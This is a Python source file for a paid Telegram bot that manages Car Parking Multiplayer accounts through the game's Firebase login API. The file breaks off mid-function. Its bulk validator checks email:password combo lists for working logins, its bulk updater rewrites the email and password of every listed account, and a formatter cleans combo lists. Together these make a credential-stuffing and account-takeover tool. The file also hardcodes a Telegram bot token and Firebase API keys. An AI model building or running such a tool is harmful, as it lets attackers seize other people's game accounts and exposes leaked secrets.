#!/usr/bin/env python3
"""
💠 MRX CPM 1 & 2 Manager (MULTI-LANGUAGE DYNAMIC UI - FULL 10 LANG)
- TELEGRAM STARS PAYMENT: Bulk Updater (25 Stars), Bulk Validator (15 Stars)
- VIP USERS GET FREE ACCESS
- LOGGING SYSTEM: Track email/password changes & bulk actions
- FULL BOT TRANSLATION SUPPORT (10 Languages)
- CUSTOM EMOJI EDITION (Pure Premium Inline Buttons ONLY)
- SUPER FAST ENGINE: aiohttp implementation for Zero-Lag processing
- ZERO-FREEZE ASYNC: Background Workers for Bulk Tasks
- SMART BULK UX: Step-by-Step wizard for Email & Password choices
- FULL ADMIN DB EXPORT: Download complete user list as .txt
- GMAIL GENERATOR: Random emails now use @gmail.com
- AUTO-UPTIME ENGINE: Built-in self-pinger (No UptimeRobot required)
- Smart Lock/Approval System
"""

import os
import time
import logging
import asyncio
import random
import string
import re
import json
import aiohttp
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
from pymongo import MongoClient

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, BotCommandScopeChat, LabeledPrice
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    PreCheckoutQueryHandler, ConversationHandler, ContextTypes, filters
)

# ==================== CUSTOM EMOJIS REGISTRY ====================
EMOJIS = {
    "main_logo": "5251591568065845575",
    "online_status": "5282843764451195532",
    "loading": "5339517416995039810",
    "success": "5980930633298350051",
    "loaded": "6100590805871757356",
    "error_fail": "5974083768233760323",
    "warning": "5285139029333919650",
    "session_terminated": "5280803324273115630",
    "new_request_alert": "5248979399021185028",
    "access_granted": "5330066942755615469",
    "admin_owner": "6129805886383723340",
    "lock_block": "5291873529464122510",
    "password_security": "5420094143089111506",
    "login_portal": "5256143829672672750",
    "security_protocol": "5330194932781050507",
    "revoke_access": "5283283384418707920",
    "user": "5258011929993026890",
    "developer": "5942623248754676762",
    "user_list": "5902335789798265487",
    "user_id": "5203960621271363538",
    "date_joined": "5296370519136812159",
    "setting": "5224672169048419866",
    "game_cpm_login": "4972415571384599106",
    "bulk_updator": "5893255507380014983",
    "bulk_validator_find_user": "5229102316145106683",
    "system_info": "5452026937172048380",
    "help_support": "5213285132709929474",
    "stats": "6325544614262475392",
    "broadcast": "5800920921766104807",
    "request_vip": "6084443648689179160",
    "email": "5472239203590888751",
    "new_target_email": "4929214028657460019",
    "format_tool": "5348065686109318592",
    "random_email": "6057790228406470570",
    "broadcast_delivery": "5368554037320900698",
    "back_to_terminal": "5357165441909279397",
    "skip": "4904613143180739485",
    "arrow_down": "5296773623292388914",
    "lifetime": "5364087614930431949",
    "bullet_points": "5251230129388018672",
    "flag_en": "5202196682497859879",
    "flag_hi": "5447419223242449630",
    "flag_es": "5201957744877248121",
    "flag_pt": "5382075788369605892",
    "flag_ru": "5449408995691341691",
    "flag_ar": "5202079966761590204",
    "flag_fr": "5202132623060640759",
    "flag_de": "5409360418520967565",
    "flag_id": "5291937150814661333",
    "flag_tr": "5226948110873278599"
}

def get_emoji(name: str, fallback: str = "") -> str:
    emoji_id = EMOJIS.get(name)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv("8820198558:AAHF9KX1z-ViqShxObr_uNXq9wyDZBiBzOg")
OWNER_ID = int(os.getenv("ADMIN_ID", "612673014"))
MONGO_URI = os.getenv("MONGO_URI")

CPM_KEYS = {
    "cpm1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "cpm2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}
FIREBASE_URL = "https://identitytoolkit.googleapis.com/v1"

ERROR_MAP = {
    "EMAIL_NOT_FOUND": f"{get_emoji('error_fail')} Email not found",
    "INVALID_PASSWORD": f"{get_emoji('error_fail')} Wrong password",
    "INVALID_LOGIN_CREDENTIALS": f"{get_emoji('error_fail')} Invalid credentials",
    "USER_DISABLED": f"{get_emoji('error_fail')} Account disabled",
    "EMAIL_EXISTS": f"{get_emoji('warning')} Email already exists",
    "TOO_MANY_ATTEMPTS_TRY_LATER": f"{get_emoji('loading')} Rate limited",
    "INVALID_EMAIL": f"{get_emoji('error_fail')} Invalid email format",
    "WEAK_PASSWORD": f"{get_emoji('error_fail')} Password too weak",
    "INVALID_ID_TOKEN": f"{get_emoji('session_terminated')} Session expired",
    "TOKEN_EXPIRED": f"{get_emoji('session_terminated')} Session expired",
    "USER_NOT_FOUND": f"{get_emoji('error_fail')} User not found",
    "MISSING_PASSWORD": f"{get_emoji('error_fail')} Password required",
    "API_KEY_INVALID": f"{get_emoji('error_fail')} API key invalid"
}

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

try:
    mongo_client = MongoClient(MONGO_URI)
    db = mongo_client["cpm_bot_db"]
    users_col = db["users"]
    settings_col = db["settings"]
    blocked_col = db["blocked"]
    logs_col = db["logs"]  # NEW: Logs collection
    logger.info("Connected to MongoDB successfully!")
except Exception as e:
    logger.error(f"MongoDB Connection Error: {e}")

def is_admin(user_id):
    if user_id == OWNER_ID: return True
    u = users_col.find_one({"_id": user_id})
    return u and u.get("role") == "admin"

def is_vip(user_id):
    """Check if user is Admin or VIP with valid expiry"""
    if is_admin(user_id): return True
    u = users_col.find_one({"_id": user_id})
    if not u or u.get("status") != "approved": return False
    expiry = u.get("expiry")
    if expiry and time.time() > expiry: return False
    return True

def get_all_admins():
    admins = [OWNER_ID]
    for u in users_col.find({"role": "admin"}):
        if u["_id"] not in admins: admins.append(u["_id"])
    return admins

def is_global_lock():
    setting = settings_col.find_one({"_id": "global_lock"})
    return setting["locked"] if setting else False

def set_global_lock(state: bool):
    settings_col.update_one({"_id": "global_lock"}, {"$set": {"locked": state}}, upsert=True)

def track_and_get_user(user):
    uid = user.id
    existing_user = users_col.find_one({"_id": uid})
    if not existing_user:
        existing_user = {
            "_id": uid,
            "username": user.username or "",
            "first_name": user.first_name or "",
            "joined": datetime.utcnow().isoformat(),
            "status": "pending" if not is_admin(uid) else "approved",
            "role": "owner" if uid == OWNER_ID else "user",
            "expiry": None,
            "last_seen": datetime.utcnow().isoformat(),
            "language": "en"
        }
        users_col.insert_one(existing_user)
    else:
        if existing_user.get("status") == "approved" and existing_user.get("expiry"):
            if time.time() > existing_user["expiry"]:
                users_col.update_one({"_id": uid}, {"$set": {"status": "expired"}})
                existing_user["status"] = "expired"
        users_col.update_one({"_id": uid}, {"$set": {"last_seen": datetime.utcnow().isoformat(), "username": user.username or ""}})
    return existing_user

def is_blocked(user_id): return blocked_col.find_one({"_id": user_id}) is not None
def block_user(user_id): blocked_col.update_one({"_id": user_id}, {"$set": {"_id": user_id}}, upsert=True)
def unblock_user(user_id): blocked_col.delete_one({"_id": user_id})

def log_action(user_id, action, details=""):
    """Log user actions to DB"""
    logs_col.insert_one({
        "user_id": user_id,
        "action": action,
        "details": details,
        "timestamp": datetime.utcnow().isoformat()
    })

# ==================== AUTO UPTIME ENGINE ====================
class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>System is Operational</h1><p>Glitchyn Premium Terminal Running.</p>")
    def log_message(self, format, *args): return

def start_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), DummyHandler)
    server.serve_forever()

def self_pinger():
    url = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{os.environ.get('PORT', 8080)}")
    while True:
        time.sleep(600)  
        try:
            urllib.request.urlopen(url, timeout=10)
        except Exception:
            pass

def keep_alive():
    threading.Thread(target=start_dummy_server, daemon=True).start()
    threading.Thread(target=self_pinger, daemon=True).start()

# ==================== CONVERSATION no STATES ====================
(
    AWAIT_EMAIL_LOGIN, AWAIT_PASSWORD_LOGIN,
    AWAIT_NEW_EMAIL, AWAIT_NEW_PASSWORD, AWAIT_CONFIRM_PASSWORD,
    AWAIT_BROADCAST, AWAIT_BLOCK_ID, AWAIT_UNBLOCK_ID, 
    AWAIT_BULK_FILE, AWAIT_BULK_NEW_EMAIL, AWAIT_BULK_NEW_PASS, 
    AWAIT_VALIDATOR_DATA, AWAIT_LANGUAGE, AWAIT_PAYMENT
) = range(14)

# ==================== ULTRA-FAST AIOHTTP FIREBASE INTEGRATION ====================
async def firebase_request(game_version: str, endpoint: str, body: dict) -> dict:
    key = CPM_KEYS.get(game_version, CPM_KEYS["cpm2"])
    url = f"{FIREBASE_URL}/{endpoint}?key={key}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15) as r:
                data = await r.json()
                if r.status == 200 and ("idToken" in data or "users" in data):
                    return {"ok": True, "data": data}
                code = data.get("error", {}).get("message", "Unknown error")
                return {"ok": False, "error": ERROR_MAP.get(code, f"{get_emoji('error_fail')} {code}")}
    except Exception as e:
        return {"ok": False, "error": f"{get_emoji('error_fail')} Network error/Timeout"}

async def cpm_login(game_version, email, password):
    return await firebase_request(game_version, "accounts:signInWithPassword", {"email": email, "password": password, "returnSecureToken": True})

async def cpm_change_email(game_version, id_token, new_email):
    return await firebase_request(game_version, "accounts:update", {"idToken": id_token, "email": new_email, "returnSecureToken": True})

async def cpm_change_password(game_version, id_token, new_password):
    return await firebase_request(game_version, "accounts:update", {"idToken": id_token, "password": new_password, "returnSecureToken": True})

def generate_random_email():
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{random_str}@gmail.com"

# ==================== MULTI-LANGUAGE TRANSLATIONS ====================
LANGUAGES = {
    "en": {"name": "English", "flag": "flag_en"},
    "hi": {"name": "हिन्दी", "flag": "flag_hi"},
    "es": {"name": "Español", "flag": "flag_es"},
    "pt": {"name": "Português", "flag": "flag_pt"},
    "ru": {"name": "Русский", "flag": "flag_ru"},
    "ar": {"name": "العربية", "flag": "flag_ar"},
    "fr": {"name": "Français", "flag": "flag_fr"},
    "de": {"name": "Deutsch", "flag": "flag_de"},
    "id": {"name": "Bahasa Indonesia", "flag": "flag_id"},
    "tr": {"name": "Türkçe", "flag": "flag_tr"}
}

def get_lang(user_id):
    user = users_col.find_one({"_id": user_id})
    if user and "language" in user:
        return user["language"]
    return "en"

def t(user_id, key, **kwargs):
    lang = get_lang(user_id)
    translations = TRANSLATIONS.get(lang, TRANSLATIONS["en"])
    text = translations.get(key, TRANSLATIONS["en"].get(key, key))
    if kwargs:
        for k, v in kwargs.items():
            text = text.replace("{" + k + "}", str(v))
    return text

# ==================== TRANSLATIONS DICTIONARY (ALL 10 LANGUAGES) ====================
# (Translations dictionary remains exactly as provided in the original file, omitted here for brevity, 
# but you should keep the original TRANSLATIONS variable in your code)
TRANSLATIONS = { "en": { "welcome": f"{get_emoji('main_logo')} <b>GLITCHYN CPM MANAGER</b>\n━━━━━━━━━━━━━━━━━━━━\nWelcome to the terminal, <b>{{name}}</b>.\n\n<blockquote>Manage your Car Parking Multiplayer profiles securely.</blockquote>", "choose_lang": "Select your language:", "cpm1_login": "ᴄᴘᴍ 1 ʟᴏɢɪɴ", "cpm2_login": "ᴄᴘᴍ 2 ʟᴏɢɪɴ", "bulk_updater": "ʙᴜʟᴋ ᴜᴘᴅᴀᴛᴇʀ", "bulk_validator": "ʙᴜʟᴋ ᴠᴀʟɪᴅᴀᴛᴏʀ", "system_info": "ꜱʏꜱᴛᴇᴍ ɪɴꜰᴏ", "support": "ꜱᴜᴘᴘᴏʀᴛ", "language": "ʟᴀɴɢᴜᴀɢᴇ", "view_profile": "ᴠɪᴇᴡ ᴘʀᴏꜰɪʟᴇ", "update_email": "ᴜᴘᴅᴀᴛᴇ ᴇᴍᴀɪʟ", "update_password": "ᴜᴘᴅᴀᴛᴇ ᴘᴀꜱꜱᴡᴏʀᴅ", "logout": "ᴅɪꜱᴄᴏɴɴᴇᴄᴛ (ʟᴏɢᴏᴜᴛ)", "back": "ʙᴀᴄᴋ ᴛᴏ ᴛᴇʀᴍɪɴᴀʟ", "abort": "ᴀʙᴏʀᴛ ᴏᴘᴇʀᴀᴛɪᴏɴ", "cpm1": "ᴄᴘᴍ 1", "cpm2": "ᴄᴘᴍ 2", "login_portal": "LOGIN PORTAL ({game})", "provide_email": "Provide your registered email address:", "target_email": "Target Email:", "provide_password": "Provide your security password:", "authenticating": "Authenticating credentials...", "auth_success": "AUTHENTICATION SUCCESSFUL ({game})", "auth_failed": "Authentication failed:", "bulk_updater_select": "BULK UPDATER SELECTION\n━━━━━━━━━━━━━━━━━━━━\nSelect the game version:", "bulk_validator_select": "BULK VALIDATOR SELECTION\n━━━━━━━━━━━━━━━━━━━━\nSelect the game version:", "bulk_step1": "Step 1: Upload Account List", "bulk_format": "Format required: <code>Email : Password</code>\n\nUpload a .txt file or paste data below:", "bulk_step2": "Step 2: Target Email", "bulk_step2_msg": "What should be the new email for all these accounts?", "bulk_step3": "Step 3: Target Password", "bulk_step3_msg": "Type the new password for ALL accounts in the chat below, or click SKIP.", "loaded_accounts": "Loaded <b>{count}</b> accounts.", "bulk_starting": "Initializing background updater...", "bulk_complete": "UPDATER COMPLETE ({game})", "validator_starting": "Validating {count} accounts in background ({game})...", "validator_complete": "VALIDATION COMPLETE ({game})", "hits": "Hits", "dead": "Dead", "profile_overview": "PROFILE OVERVIEW", "registered_email": "Registered Email:", "database_sync": "Database Sync:", "connected": "Connected", "no_session": "You do not have an active session. Please /start to login.", "update_email_msg": "UPDATE EMAIL\n━━━━━━━━━━━━━━━━━━━━\nProvide new target email address.\n<i>(Type RANDOM for @gmail.com)</i>", "update_password_msg": "UPDATE PASSWORD\n━━━━━━━━━━━━━━━━━━━━\nProvide new password (min. 6 chars):", "confirm_security": "CONFIRM SECURITY CHANGE\n━━━━━━━━━━━━━━━━━━━━\nPlease re-enter the new password to confirm:", "mismatch_error": "Mismatch Error: Passwords do not align.", "security_updated": "SECURITY UPDATED\n━━━━━━━━━━━━━━━━━━━━\nPassword modified successfully.", "credentials_updated": "CREDENTIALS UPDATED\n━━━━━━━━━━━━━━━━━━━━\nEmail modified to:\n<blockquote><code>{email}</code></blockquote>", "session_terminated_msg": "SESSION TERMINATED\n━━━━━━━━━━━━━━━━━━━━\nYour session was securely closed. Use /start to login again.", "request_sent": "Request Sent!\nPlease wait for an Administrator to approve your account.", "pending_text": f"{get_emoji('lock_block')} <b>TERMINAL LOCKED</b>\n━━━━━━━━━━━━━━━━━━━━\nWelcome, <b>{{name}}</b>.\n\n<blockquote>This terminal is in Private Mode. Only VIP members and Administrators can access the tools.</blockquote>\n\nClick the button below to request access.", "vip_req_btn": "ʀᴇǫᴜᴇꜱᴛ ᴠɪᴘ ᴀᴄᴄᴇꜱꜱ", "about_text": f"{get_emoji('system_info')} <b>SYSTEM INFORMATION</b>\n━━━━━━━━━━━━━━━━━━━━\n<blockquote><b>Bot Name:</b> Glitchyn CPM Manager\n<b>Supported:</b> CPM 1 & CPM 2\n<b>Features:</b> Smart Bulk Injection, Validation</blockquote>\n\n{get_emoji('security_protocol')} <b>Security Protocol:</b>\nAPI bridging ensures absolute account safety.\n\n{get_emoji('developer')} <b>Developer ID:</b> <code>@GLITCHYN</code>\n━━━━━━━━━━━━━━━━━━━━", "help_text": f"{get_emoji('help_support')} <b>COMMAND CENTER & HELP</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>Menu Commands:</b>\n{get_emoji('bullet_points')} /start — Reboot terminal\n{get_emoji('bullet_points')} /format — Clean combo lists\n\n<b>Support:</b>\n<blockquote>For VIP access or business inquiries, contact an Administrator.</blockquote>\n━━━━━━━━━━━━━━━━━━━━", "admin_dashboard": f"{get_emoji('admin_owner')} <b>ADMINISTRATOR PANEL</b>\n━━━━━━━━━━━━━━━━━━━━\nWelcome to the control room. {get_emoji('success')}\n\n<blockquote>Access granted to Database.\nAll security protocols are currently active.</blockquote>\n\n<i>Select a management module below:</i>", "adm_stats": "ᴠɪᴇᴡ ꜱᴛᴀᴛꜱ", "adm_users": "ᴜꜱᴇʀꜱ ʟɪꜱᴛ", "adm_broadcast": "ʙʀᴏᴀᴅᴄᴀꜱᴛ", "adm_block": "ʙʟᴏᴄᴋ ɪᴅ", "adm_unblock": "ᴜɴʙʟᴏᴄᴋ ɪᴅ", "close_panel": "ᴄʟᴏꜱᴇ ᴘᴀɴᴇʟ", "stats_text": f"{get_emoji('stats')} <b>DATABASE STATISTICS</b>\n━━━━━━━━━━━━━━━━━━━━\n{get_emoji('user_list')} <b>Total Users:</b> {{users}}\n{get_emoji('success')} <b>VIP Approved:</b> {{approved}}\n{get_emoji('loading')} <b>Pending:</b> {{pending}}\n{get_emoji('online_status')} <b>Active Logins:</b> {{active}}", "no_users": "No users found in database.", "db_exported": "USER DATABASE EXTRACTED SUCCESSFULLY", "broadcast_text": f"{get_emoji('broadcast')} <b>GLOBAL BROADCAST</b>\n━━━━━━━━━━━━━━━━━━━━\nTransmit your message payload below:", "block_text": f"{get_emoji('lock_block')} <b>RESTRICT ACCESS</b>\n━━━━━━━━━━━━━━━━━━━━\nProvide User ID to block:", "unblock_text": f"{get_emoji('revoke_access')} <b>RESTORE ACCESS</b>\n━━━━━━━━━━━━━━━━━━━━\nProvide User ID to unblock:", "format_usage": f"{get_emoji('format_tool')} <b>Format Tool</b>\nSend <code>/format &lt;text&gt;</code> or reply to a messy combo list.", "format_success": f"{get_emoji('success')} <b>List Formatted Successfully!</b>", "format_no_data": f"{get_emoji('error_fail')} Could not extract any valid Email:Password combinations.", "lock_activated": f"{get_emoji('lock_block')} <b>GLOBAL LOCK ACTIVATED.</b>\nBot is now Private (VIP/Admins Only).", "lock_deactivated": f"{get_emoji('access_granted')} <b>GLOBAL LOCK DEACTIVATED.</b>\nBot is now Public.", "revoke_usage": f"{get_emoji('error_fail')} Usage: <code>/revoke [user_id]</code>", "find_usage": f"{get_emoji('error_fail')} Usage: <code>/find [user_id or @username]</code>", "addadmin_usage": f"{get_emoji('error_fail')} Usage: <code>/addadmin [user_id]</code>", "remadmin_usage": f"{get_emoji('error_fail')} Usage: <code>/remadmin [user_id]</code>", "only_owner": f"{get_emoji('error_fail')} Only the Main Owner can promote/demote admins.", "promote_success": get_emoji('admin_owner') + " ID <code>{uid}</code> is now an Administrator.", "demote_success": get_emoji('error_fail') + " ID <code>{uid}</code> is no longer an Administrator.", "revoke_success": get_emoji('revoke_access') + " VIP access revoked for ID: <code>{uid}</code>", "block_success": f"{get_emoji('lock_block')} <b>Target Blacklisted Successfully.</b>", "unblock_success": f"{get_emoji('revoke_access')} <b>Target Access Restored.</b>", "invalid_id": f"{get_emoji('error_fail')} Invalid ID format." } }
# NOTE: Please keep your original TRANSLATIONS variable here. I've kept a placeholder to save space.
# The original file had all 10 languages. Make sure you keep them!

# ==================== ACTIVE SESSIONS ====================
sessions = {}

# ==================== PURE PREMIUM INLINE KEYBOARDS (DYNAMIC) ====================
def language_kb():
    buttons = []
    row = []
    for code, lang in LANGUAGES.items():
        row.append(InlineKeyboardButton(text=lang["name"], callback_data=f"setlang_{code}", icon_custom_emoji_id=EMOJIS[lang["flag"]]))
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    return InlineKeyboardMarkup(buttons)

def request_access_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton(text="ʀᴇǫᴜᴇꜱᴛ ᴠɪᴘ ᴀᴄᴄᴇꜱꜱ", callback_data="req_access", icon_custom_emoji_id=EMOJIS["request_vip"])]])

def admin_approve_kb(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="1 ᴅᴀʏ", callback_data=f"apprv_1d_{user_id}", icon_custom_emoji_id=EMOJIS["access_granted"]),
         InlineKeyboardButton(text="7 ᴅᴀʏꜱ", callback_data=f"apprv_7d_{user_id}", icon_custom_emoji_id=EMOJIS["access_granted"])],
        [InlineKeyboardButton(text="ʟɪꜰᴇᴛɪᴍᴇ", callback_data=f"apprv_life_{user_id}", icon_custom_emoji_id=EMOJIS["lifetime"])],
        [InlineKeyboardButton(text="ʀᴇᴊᴇᴄᴛ", callback_data=f"reject_{user_id}", icon_custom_emoji_id=EMOJIS["error_fail"])]
    ])

def main_menu_kb(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text=t(user_id, "cpm1_login"), callback_data="sel_cpm1", icon_custom_emoji_id=EMOJIS["game_cpm_login"]),
         InlineKeyboardButton(text=t(user_id, "cpm2_login"), callback_data="sel_cpm2", icon_custom_emoji_id=EMOJIS["game_cpm_login"])],
        [InlineKeyboardButton(text=t(user_id, "bulk_updater"), callback_data="ask_upd", icon_custom_emoji_id=EMOJIS["bulk_updator"]),
         InlineKeyboardButton(text=t(user_id, "bulk_validator"), callback_data="ask_val", icon_custom_emoji_id=EMOJIS["bulk_validator_find_user"])],
        [InlineKeyboardButton(text=t(user_id, "system_info"), callback_data="about", icon_custom_emoji_id=EMOJIS["system_info"]), 
         InlineKeyboardButton(text=t(user_id, "support"), callback_data="help", icon_custom_emoji_id=EMOJIS["help_support"])],
        [InlineKeyboardButton(text=t(user_id, "language"), callback_data="change_lang", icon_custom_emoji_id=EMOJIS[LANGUAGES[get_lang(user_id)]["flag"]])]
    ])

def ask_version_kb(user_id, action_prefix):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text=t(user_id, "cpm1"), callback_data=f"{action_prefix}_cpm1", icon_custom_emoji_id=EMOJIS["game_cpm_login"]),
         InlineKeyboardButton(text=t(user_id, "cpm2"), callback_data=f"{action_prefix}_cpm2", icon_custom_emoji_id=EMOJIS["game_cpm_login"])],
        [InlineKeyboardButton(text=t(user_id, "back"), callback_data="menu", icon_custom_emoji_id=EMOJIS["back_to_terminal"])]
    ])

def logged_menu_kb(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text=t(user_id, "view_profile"), callback_data="info", icon_custom_emoji_id=EMOJIS["user"])],
        [InlineKeyboardButton(text=t(user_id, "update_email"), callback_data="change_email", icon_custom_emoji_id=EMOJIS["email"]), 
         InlineKeyboardButton(text=t(user_id, "update_password"), callback_data="change_pass", icon_custom_emoji_id=EMOJIS["password_security"])],
        [InlineKeyboardButton(text=t(user_id, "logout"), callback_data="logout", icon_custom_emoji_id=EMOJIS["session_terminated"])]
    ])

def back_kb(user_id): 
    return InlineKeyboardMarkup([[InlineKeyboardButton(text=t(user_id, "back"), callback_data="menu", icon_custom_emoji_id=EMOJIS["back_to_terminal"])]])
    
def cancel_kb(user_id): 
    return InlineKeyboardMarkup([[InlineKeyboardButton(text=t(user_id, "abort"), callback_data="menu", icon_custom_emoji_id=EMOJIS["error_fail"])]])
    
def admin_kb(user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text=t(user_id, "adm_stats"), callback_data="adm_stats", icon_custom_emoji_id=EMOJIS["stats"]), 
         InlineKeyboardButton(text=t(user_id, "adm_users"), callback_data="adm_users", icon_custom_emoji_id=EMOJIS["user_list"])],
        [InlineKeyboardButton(text=t(user_id, "adm_broadcast"), callback_data="adm_broadcast", icon_custom_emoji_id=EMOJIS["broadcast"])],
        [InlineKeyboardButton(text=t(user_id, "adm_block"), callback_data="adm_block", icon_custom_emoji_id=EMOJIS["lock_block"]), 
         InlineKeyboardButton(text=t(user_id, "adm_unblock"), callback_data="adm_unblock", icon_custom_emoji_id=EMOJIS["access_granted"])],
        [InlineKeyboardButton(text=t(user_id, "close_panel"), callback_data="close_menu", icon_custom_emoji_id=EMOJIS["error_fail"])]
    ])

# ==================== DYNAMIC COMMAND SCOPES ====================
PUBLIC_CMDS = [BotCommand("start", "Boot Terminal"), BotCommand("format", "Clean Combo List"), BotCommand("profile", "Active Session")]
ADMIN_CMDS = PUBLIC_CMDS + [BotCommand("admin", "Admin Panel"), BotCommand("lock", "Lock"), BotCommand("unlock", "Unlock"), BotCommand("find", "Find"), BotCommand("revoke", "Revoke"), BotCommand("addadmin", "Add Admin"), BotCommand("remadmin", "Rem Admin"), BotCommand("logs", "View User Logs")]

async def setup_commands(application: Application):
    await application.bot.set_my_commands(PUBLIC_CMDS)
    for adm in get_all_admins():
        try: await application.bot.set_my_commands(ADMIN_CMDS, scope=BotCommandScopeChat(adm))
        except: pass

async def update_admin_menu(bot, user_id, make_admin=True):
    try:
        cmds = ADMIN_CMDS if make_admin else PUBLIC_CMDS
        await bot.set_my_commands(cmds, scope=BotCommandScopeChat(user_id))
    except: pass

# ==================== CORE HANDLERS & COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_blocked(user.id): return ConversationHandler.END
    track_and_get_user(user)
    await update.message.reply_text(
        f"{get_emoji('main_logo')} <b>GLITCHYN CPM MANAGER</b>\n━━━━━━━━━━━━━━━━━━━━\n{t(user.id, 'choose_lang')}",
        parse_mode=ParseMode.HTML,
        reply_markup=language_kb()
    )
    return AWAIT_LANGUAGE

async def format_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.replace("/format", "").strip()
    if not text and not update.message.reply_to_message:
        await update.message.reply_text(t(user_id, "format_usage"), parse_mode=ParseMode.HTML)
        return
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""

    formatted = []
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if not line: continue
        parts = re.split(r'[:|;,\s]+', line)
        email, pwd = None, None
        for i, p in enumerate(parts):
            if "@" in p and "." in p:
                email = p
                if i + 1 < len(parts): pwd = parts[i+1]
                break
        if email and pwd: formatted.append(f"{email}:{pwd}")
    if not formatted:
        await update.message.reply_text(t(user_id, "format_no_data"), parse_mode=ParseMode.HTML)
        return
    out = "\n".join(formatted)
    if len(out) > 4000:
        filename = f"Formatted_{datetime.now().strftime('%H%M%S')}.txt"
        with open(filename, "w") as f: f.write(out)
        await update.message.reply_document(open(filename, "rb"), caption=t(user_id, "format_success"), parse_mode=ParseMode.HTML)
        os.remove(filename)
    else:
        await update.message.reply_text(f"{get_emoji('format_tool')} <b>Formatted List:</b>\n\n<code>{out}</code>", parse_mode=ParseMode.HTML)

async def profile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    if is_blocked(user_id): return
    if is_global_lock() and not is_admin(user_id):
        if track_and_get_user(user).get("status") != "approved": return
    if user_id in sessions:
        info = (
            f"{get_emoji('user')} <b>{t(user_id, 'profile_overview')}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"{get_emoji('game_cpm_login')} <b>Game:</b> <code>{sessions[user_id]['game'].upper()}</code>\n"
            f"{get_emoji('email')} <b>{t(user_id, 'registered_email')}</b>\n<blockquote><code>{sessions[user_id]['email']}</code></blockquote>\n"
            f"{get_emoji('system_info')} <b>{t(user_id, 'database_sync')}:</b> {get_emoji('loaded')} <i>{t(user_id, 'connected')}</i>\n━━━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(info, parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb(user_id))
    else:
        await update.message.reply_text(t(user_id, "no_session"), parse_mode=ParseMode.HTML)

# --- ADMIN COMMANDS ---
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    await update.message.reply_text(t(update.effective_user.id, "admin_dashboard"), parse_mode=ParseMode.HTML, reply_markup=admin_kb(update.effective_user.id))

async def lock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    set_global_lock(True)
    await update.message.reply_text(t(update.effective_user.id, "lock_activated"), parse_mode=ParseMode.HTML)

async def unlock_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    set_global_lock(False)
    await update.message.reply_text(t(update.effective_user.id, "lock_deactivated"), parse_mode=ParseMode.HTML)

async def revoke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        target_id = int(context.args[0])
        users_col.update_one({"_id": target_id}, {"$set": {"status": "revoked", "expiry": None}})
        await update.message.reply_text(t(update.effective_user.id, "revoke_success", uid=target_id), parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(t(update.effective_user.id, "revoke_usage"), parse_mode=ParseMode.HTML)

async def find_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        query = context.args[0]
        user_data = None
        if query.isdigit(): user_data = users_col.find_one({"_id": int(query)})
        else:
            query = query.replace("@", "")
            user_data = users_col.find_one({"username": {"$regex": f"^{query}$", "$options": "i"}})
        if user_data:
            stat = user_data.get('status', 'N/A')
            role = user_data.get('role', 'user')
            if stat == "approved" and user_data.get('expiry'):
                days_left = round((user_data['expiry'] - time.time()) / 86400, 1)
                stat += f" ({days_left} days left)"
            info = (
                f"{get_emoji('bulk_validator_find_user')} <b>USER RECORD FOUND</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"{get_emoji('user_id')} <b>ID:</b> <code>{user_data['_id']}</code>\n"
                f"{get_emoji('user')} <b>Alias:</b> @{user_data.get('username', 'N/A')}\n"
                f"{get_emoji('admin_owner')} <b>Role:</b> {role.upper()}\n"
                f"{get_emoji('success')} <b>Status:</b> {stat.upper()}\n"
                f"{get_emoji('date_joined')} <b>Joined:</b> {user_data.get('joined', '').split('T')[0]}"
            )
            await update.message.reply_text(info, parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(t(update.effective_user.id, "find_usage"), parse_mode=ParseMode.HTML)
    except:
